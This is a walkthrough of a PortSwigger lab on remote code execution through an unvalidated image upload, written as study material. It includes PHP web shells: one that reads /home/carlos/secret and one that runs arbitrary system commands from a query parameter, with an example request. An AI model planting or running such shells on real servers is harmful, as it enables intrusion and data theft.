# Lab: Remote code execution via web shell upload

## Description

 This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file */home/carlos/secret*. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: *wiener:peter* 

## Tips from portswigger

### Content-type response header

The Content-Type response header may provide clues as to what kind of file the server thinks it has served. If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping.

### php webshells

A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint. 

#### Example to read a file on server

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```
 Once uploaded, sending a request for this malicious file will return the target file's contents in the response. 

#### Example to execute a command

```php
<?php echo system($_GET['command']); ?>
```
 This script enables you to pass an arbitrary system command via a query parameter as follows: 
 
 ```
GET /example/exploit.php?command=id HTTP/1.1
```

# Step 1: Map file upload functionality

![image](https://user-images.githubusercontent.com/83407557/171083986-23c2e1f5-7e5e-4030-9386-29da800b2035.png)

First I try and load a sample jpg avatar, and picked some clip art just to test. I get a directory listing for where the file is being saved

![image](https://user-images.githubusercontent.com/83407557/171084335-2340d95b-3411-462c-a164-dee08658f9be.png)


I see the directory listing by viewing the page source in my browser:

![image](https://user-images.githubusercontent.com/83407557/171085334-32723121-2161-429f-a2ce-a0867dae7062.png)

![image](https://user-images.githubusercontent.com/83407557/171085516-ba72c566-dd9d-4b63-b2b9-acb1b253a422.png)


# Step 2: Attempt to upload a webshell

I am going to create the following file on my computer, and then upload it, and attempt to get it to execute on the server.


get_secret.php
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

And I see that it was able to be uploaded

![image](https://user-images.githubusercontent.com/83407557/171086519-275d5169-5ace-4dc0-9163-edd34986b5fb.png)


# Step 3. Execute uploaded php file on server and return secret

The same way I got to my nana avatar, I can go to /files/avatars/get_secret.php and the server should execute the code.

![image](https://user-images.githubusercontent.com/83407557/171086753-fccefb8e-ec54-4b53-a574-d794a0a2699f.png)


# Step 4. Submit secret

![image](https://user-images.githubusercontent.com/83407557/171086829-68c878ff-e664-4d6b-a9ef-246202aa8aa2.png)

![image](https://user-images.githubusercontent.com/83407557/171086869-f3e8371a-8937-4b0f-96dd-fd41d9d4204c.png)





